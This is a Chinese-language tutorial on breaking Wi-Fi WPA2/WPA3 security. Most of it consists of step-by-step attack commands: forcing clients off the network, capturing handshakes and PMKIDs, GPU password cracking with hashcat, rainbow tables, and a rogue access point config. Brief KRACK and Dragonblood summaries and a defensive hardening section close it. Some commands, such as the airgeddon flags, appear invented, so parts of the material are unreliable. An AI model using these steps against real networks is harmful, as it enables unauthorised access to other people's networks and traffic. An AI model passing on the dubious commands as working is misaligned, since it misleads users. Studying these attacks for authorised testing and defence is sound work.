# Wi-Fi攻击WPA2-WPA3破解

## 概述

Wi-Fi安全协议经历了WEP→WPA→WPA2→WPA3的演进。WPA2仍是目前部署最广泛的协议，但4次握手（4-Way Handshake）和PMKID攻击可破解其预共享密钥。WPA3引入SAE（Simultaneous Authentication of Equals）握手，但同样存在Dragonblood等降级攻击漏洞。

## WPA2攻击

### 4次握手抓取

WPA2-PSK认证过程中客户端和AP之间进行4次握手，此过程中包含可用于离线破解的信息：

```bash
# 1. 设置网卡为监听模式
airmon-ng start wlan0

# 2. 扫描目标AP
airodump-ng wlan0mon

# 3. 捕获特定信道的4次握手
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# 4. 强制客户端重新认证（捕获握手）
aireplay-ng -0 2 -a AP_BSSID -c CLIENT_BSSID wlan0mon

# 5. 确认握手已捕获
# 界面显示 "WPA handshake: XX:XX:XX:XX:XX:XX"

# 6. 使用aircrack-ng离线破解
aircrack-ng -w wordlist.txt -b AP_BSSID capture-01.cap
```

### 使用hashcat加速

```bash
# 将cap转换为hashcat格式
cap2hccapx capture-01.cap capture.hccapx

# 或使用hcxpcapngtool
hcxpcapngtool capture-01.cap -o capture.hc22000

# 使用hashcat利用GPU破解
hashcat -m 22000 capture.hc22000 wordlist.txt

# 规则破解（基于规则变异）
hashcat -m 22000 capture.hc22000 wordlist.txt -r rules/best64.rule

# 暴力破解（8位纯数字）
hashcat -m 22000 capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 使用掩码
hashcat -m 22000 capture.hc22000 -a 6 wordlist.txt ?d?d?d?d
```

### PMKID攻击

PMKID（Pairwise Master Key Identifier）攻击的优势在于不需要客户端参与，只需要AP发送的Beacon/Probe Response帧包含PMKID：

```bash
# 使用hcxdumptool直接捕获PMKID
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=15

# 或使用bettercap
bettercap -eval "set wifi.interface wlan0mon; wifi.recon on; wifi.deauth AP_BSSID"

# 将pcapng转换为hashcat格式
hcxpcapngtool capture.pcapng -o pmkid.hc22000

# 破解PMKID
hashcat -m 22000 pmkid.hc22000 wordlist.txt

# PMKID捕获无需客户端
# 只需AP发送包含PMKID的EAPOL帧
```

### 彩虹表破解

```bash
# 生成彩虹表（预先计算PMK）
genpmk -f wordlist.txt -d rainbow_table -s NETWORK_SSID

# 使用彩虹表破解
cowpatty -d rainbow_table -r capture-01.cap -s NETWORK_SSID
```

## KRACK攻击

KRACK（Key Reinstallation Attack，CVE-2017-13077）是WPA2协议级别的严重漏洞：

```text
# 漏洞原理
在4次握手的第3步，客户端安装加密密钥。
攻击者通过重放第3步消息，导致客户端重置nonce，
重用已经使用的密钥流，破坏加密完整性。

# 影响范围
- WPA2个人版和企业版都受影响
- 影响所有Wi-Fi客户端（Windows、Linux、Android、iOS）
- Linux和Android受影响最严重（wpa_supplicant自动安装空密钥）

# 攻击工具
- krackattacks-scripts (GitHub)
- hostapd-wpe (KRACK变体)

# 利用条件
攻击者必须在目标AP的无线信号范围内
需要能够拦截和重放4次握手消息
```

## WPA3攻击

WPA3引入了SAE（Simultaneous Authentication of Equals）握手工对离线字典攻击和前向保密。

### Dragonblood漏洞

```text
# Dragonblood (CVE-2019-9494 / CVE-2019-9499)

# 漏洞1：降级攻击
攻击者可强制客户端从WPA3降级到WPA2
利用WPA3 Transition Mode的兼容性

# 漏洞2：侧信道攻击
SAE握手中的密码分组操作存在时间差异
可通过侧信道恢复密码

# 漏洞3：分组密码循环次数
某些实现中密码分组循环次数不是常数
导致基于时序的侧信道信息泄露

# 漏洞4：反射攻击
攻击者反射SAE承诺消息
导致认证失败或信息泄露
```

### WPA3攻击实践

```bash
# 使用Wireshark分析SAE握手
tshark -r capture.pcap -Y "eapol"

# 检测降级攻击
# 广播WPA2 Beacon（即使AP支持WPA3）
airgeddon -i wlan0mon --fake-ap --essid "WPA3_AP" --wpa2-only

# 使用hostapd配置WPA3 Rogue AP
# 配置文件 /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan0
driver=nl80211
ssid=Fake_WPA3_AP
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=SAE
ieee80211w=2
wpa_passphrase=testpassword
```

## 攻击工具

| 工具 | 用途 | 特点 |
|------|------|------|
| aircrack-ng | 破解套件 | 抓包、破解、重放攻击 |
| hcxdumptool | PMKID捕获 | 无需客户端的WPA捕获 |
| hashcat | GPU加速破解 | 支持22000模式 |
| bettercap | 综合框架 | Wi-Fi审计+MITM |
| airgeddon | 全功能脚本 | Evil Twin+DDoS+破解 |
| cowpatty | PSK破解 | 支持彩虹表 |

## 防御措施

### WPA3迁移

```text
# WPA3优势
- SAE握手抵抗离线字典攻击
- 前向保密（即使密码泄露，无法解密已捕获流量）
- 管理帧保护（802.11w）默认启用
- 128位加密强度（WPA3-Personal）

# 迁移建议
1. 硬件兼容的设备升级到WPA3
2. 使用WPA3 Transition Mode（兼容旧设备）
3. 逐步淘汰仅支持WPA2的硬件
4. 企业网络使用WPA3-Enterprise 192位模式
```

### WPA2加固

```text
# 1. 使用强密码
- 长度12位以上
- 包含大小写字母、数字、特殊字符
- 避免字典词、常用密码、个人信息
- 建议使用随机生成的密码

# 2. 启用802.11w (MFP)
管理帧保护防止伪造解认证帧

# 3. 禁用WPS
WPS PIN可在数小时内暴力破解

# 4. 隐藏SSID
非安全措施（SSID在探听请求中仍泄露）

# 5. MAC地址过滤
辅助防护手段，MAC可伪造

# 6. 固件更新
保持AP固件最新，修复已知漏洞
```

### 企业网络加固

```text
# 使用EAP-TLS（证书认证）
- 每个设备使用独立证书
- 不存在密码破解风险
- 证书吊销机制

# RADIUS服务器安全
- 使用PEAP或EAP-TTLS时配置强密码
- 验证RADIUS服务器证书
- 使用独立RADIUS账户

# 客户端证书管理
- 定期轮换证书
- 使用SCEP自动续期
- 证书撤销列表（CRL）检查
```

## 参考资源

- [aircrack-ng](https://www.aircrack-ng.org/)
- [hashcat](https://hashcat.net/hashcat/)
- [KRACK攻击](https://www.krackattacks.com/)
- [Dragonblood](https://dragonblood.github.io/)
- [Wi-Fi Alliance Security](https://www.wi-fi.org/discover-wi-fi/security)
